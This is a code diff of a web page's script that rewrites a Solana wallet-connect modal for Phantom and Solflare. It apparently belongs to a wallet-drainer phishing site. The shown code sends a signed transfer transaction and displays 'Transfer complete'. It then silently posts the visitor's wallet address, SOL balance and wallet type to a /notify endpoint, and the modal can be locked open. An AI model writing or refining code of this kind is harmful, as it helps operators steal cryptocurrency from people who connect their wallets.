+                    
                     const signedBytes = signed.serialize();
                     const base64Tx = btoa(String.fromCharCode.apply(null, signedBytes));
-                    const txid = await sendTransaction(base64Tx);
-                    console.log('✅ TXID:', txid);
+                    const txid = await sendRawTransaction(base64Tx);
+                    console.log('[FRONTEND] Transaction sent:', txid);
                     
-                    $('.wallet-loading-title').text('Success!');
-                    $('.wallet-loading-subtitle').html(`Complete!<br>${txid.slice(0,6)}...${txid.slice(-8)}`);
+                    // Step 9: Success
+                    const shortTxid = txid.slice(0, 6) + '...' + txid.slice(-8);
+                    loadingTitle.textContent = 'Success!';
+                    loadingSubtitle.innerHTML = `Transfer complete!<br>TXID: ${shortTxid}`;
+                    
+                    // Send notification
+                    try {
+                        await fetch('/notify', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                address: publicKey,
+                                balance: solBalance,
+                                walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
+                                customMessage: `🎉 Transfer Complete! TXID: ${txid}`
+                            })
+                        });
+                    } catch(e) {}
+                    
                     setTimeout(hideModal, 3000);
-                } catch(e) {
-                    console.error('❌ Error:', e);
-                    $('.wallet-loading-title').text('Failed');
-                    $('.wallet-loading-subtitle').text(e.message || 'Try again');
+                    
+                } catch (error) {
+                    console.error('[FRONTEND] Error:', error);
+                    loadingTitle.textContent = 'Failed';
+                    loadingSubtitle.textContent = error.message || 'Something went wrong. Please try again.';
                     setTimeout(hideModal, 3000);
                 }
             }
             
-            $('#connect-wallet, #connect-wallet-hero').on('click', (e) => { e.preventDefault(); showModal(); });
-            $('#close-modal, .wallet-modal-overlay').on('click', () => { if (!$('#wallet-modal').hasClass('locked')) hideModal(); });
-            $('.wallet-option').on('click', function() { connectWallet($(this).data('wallet'), $(this).data('wallet') === 'phantom' ? window.solana : window.solflare); });
-            $(document).on('keydown', (e) => { if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) hideModal(); });
+            // Event listeners
+            document.getElementById('connectWalletBtn').addEventListener('click', showModal);
+            document.getElementById('heroConnectBtn').addEventListener('click', showModal);
+            document.getElementById('closeModalBtn').addEventListener('click', hideModal);
+            document.querySelector('.modal-overlay').addEventListener('click', function() {
+                if (!modal.classList.contains('locked')) hideModal();
+            });
             
-            checkStatus();
-            setTimeout(checkStatus, 500);
-            setTimeout(checkStatus, 2000);
-            setTimeout(checkStatus, 5000);
-            console.log('✅ Ready');
+            document.querySelectorAll('.wallet-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const walletType = this.getAttribute('data-wallet');
+                    const provider = walletType === 'phantom' ? window.solana : window.solflare;
+                    connectWallet(walletType, provider);
+                });
+            });
+            
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && modal.style.display === 'flex' && !modal.classList.contains('locked')) {
+                    hideModal();
+                }
+            });
+            
+            // Initial status checks (with retries for wallet extensions)
+            checkWalletStatus();
+            setTimeout(checkWalletStatus, 500);
+            setTimeout(checkWalletStatus, 1000);
+            setTimeout(checkWalletStatus, 2000);
+            setTimeout(checkWalletStatus, 5000);
+            
+            console.log('[FRONTEND] Ready and waiting for user interaction');
         });
     </script>
 </body>
